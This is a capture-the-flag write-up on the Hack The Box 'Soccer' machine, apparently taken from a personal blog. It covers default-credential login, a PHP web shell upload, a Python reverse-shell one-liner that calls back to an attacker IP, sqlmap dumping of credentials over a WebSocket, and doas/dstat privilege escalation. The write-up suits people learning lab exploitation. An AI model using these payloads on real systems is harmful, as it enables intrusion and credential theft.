---
layout: post
title:  "Web Socket vulnerable to SQL injection | Privilege Escalation via Doas"
author: dz
categories: [HTB]
tags: [web, ctf, linux_infrastructure, sqli, cve]
image: assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/thumbnail.png
featured: true
---

A WebSocket is a communication protocol facilitating real-time, two-way interaction between a client and server via a single TCP connection. In this article, I'm gonna tackle a SQL injection vulnerability on a websocket and leveraging "**dstat**" to get root privileges.

### Introduction
SQL injection in a websocket service??? Definitely my first time to encounter such thing. Hence, I am happy to share this encounter with you guys. This is an old machine from HTB, so some of you might say "this is familiar". Anyways, let's start the journey!!

### Recon
I did an nmap scan to the target with the following command: <br> `nmap -sC -sV -p- --min-rate 300 -vv <IP>`
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc1.png">

There are 3 open ports that was identified during the scan. Port 22, 80, and 9091. From the result, I could tell that there's SSH, website, and I have no idea what kind of service is that on the last one. 

Now, I visited the website and I used ferox buster to list the available directories: <br> `feroxbuster --url <URL>`

<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc2.png">

<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc3.png">

Based on the result, there was a `/tiny` directory, and upon visiting it, a login page appeared.
I tried performing SQL injection and bruteforce attacks, but it failed. So I went to have a quickie with google and I found out that Tiny File has a default credentials.

<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc4.png">

I tried the admin credentials and it worked. I was able to logged in! Sweeeeeet~
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc5.png">

Since it was a file manager, I bet I could upload something in it. You know, juicy stuff. Fortunately, there was one directory in which I can upload to. The rest were not writable. I upoaded a php file with the following code in it so i could execute commands to the server:
``` php
<?php system($_REQUEST['cmd']); ?>
```
I found the directory where the file was uploaded and executed a "`whoami`" command to check if it was working: <br> => `/tiny/uploads/php_shell.php?cmd=whoami` <=

It returned "`www-data`". Hence, it worked! That was sweeeeeeeet~ coooool. Now, at that point, I have executed a python command to gain a reverse shell from my machine.
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",<YOUR PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
During that time, I had to reupload the php file. I figured that there was only a specific amount of time the file stays there. I was thinking maybe there was a cron tab that deletes any files uploaded in that directory... or something like that. Anyways, moving on. I got the reverse shell.
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc6.png">

I already got a reverse shell, but I don't feel powerful enough. Upon doing some enumeration, which kinda took some time, I found out that there was a subdomain. I checked the "`/etc/hosts`" for that. I added the subdomain to my host file and browsed it to see if there were any juicy~licious things I could find.

I found a sign-up and login pages. I registered an account and logged into it.
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc7.png">

I had no idea what to do with this, so I tried putting the ticket ID. Then it returned "**Ticket Exists**". <br>
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc8.png">

Then I put arbitrary number and it returned "**Ticket Doesn't Exists**"
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc9.png">

So I thought, maybe this is vulnerable to SQL injection. I tried some payloads to verity if it is really vulnerable to SQL injection.
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc10.png">

AAAAAANNNNNNDDDDDDD IT IS!!!! Sweeeeeeeeeeet~ upon putting "**OR 1=1**", the message changed from "**Ticket Doesn't Exists**" into "**Ticket Exists**". <br> However, it seemed that it was a Blind SQL injection because there were no output to any of the payload I tried. hence, I used a tool called "**sqlmap**" to help me with this journey. 

I intercepted the request through burp and I found out that this was running on a web socket on port 9091. So I crafted my payload into this: <br> `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch`

After I executed the command, I got the list of the database:
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc11.png">

The "`soccer_db`" looked really juicy. I tried digging further with the following command: <br> `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch`

<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc12.png">

I got some credentials and I bet this could be used in authenticating through SSH.

<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc13.png">

Aaaaannnnddddd it did!!! Swweeeeeeeeeeeeeeet~~

### Privilege Escalation
Next phase after that was to escalate my privileges to root access. Instead of using linpeas, I tried doing it manually first. Took me a while though, but eventually I got it. <br>
First, I ran the command:<br> `find / -type f -perm -4000 2>/dev/null`
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc14.png">

First on the result was "`/usr/local/bin/doas`", so I did a quickie with google again, and I found out that "`doas`" executes arbitrary commands as another user. It is kinda similar to sudo command. It seemed that the config file "`doas.conf`" is juicy~licious when it comes to privilege escalation. (<a href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/" target="_blank">*click to read more*</a>)

Upon checking the config file, I found this:
<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc15.png">

Based on the contents of this config file, we can run "`/usr/bin/dstat`" as root with the use of doas. But what the heck is **dstat**??? and what on earth can I do with it. Soooo, I went to do some quickie with google...again. According to GTFOBins, I could leverage **dstat** into performing a privilege escalation. (<a href="https://gtfobins.github.io/gtfobins/dstat/" target="_blank">*click to read more*</a>)

<img src="../../blog/assets/images/018d9c4c-69c0-7121-8e2f-9bb684dbd2db/sc16.png">

And I was able to escalate my privilege to root. Swwweeeeeeeeeeett~~~

That's all for now!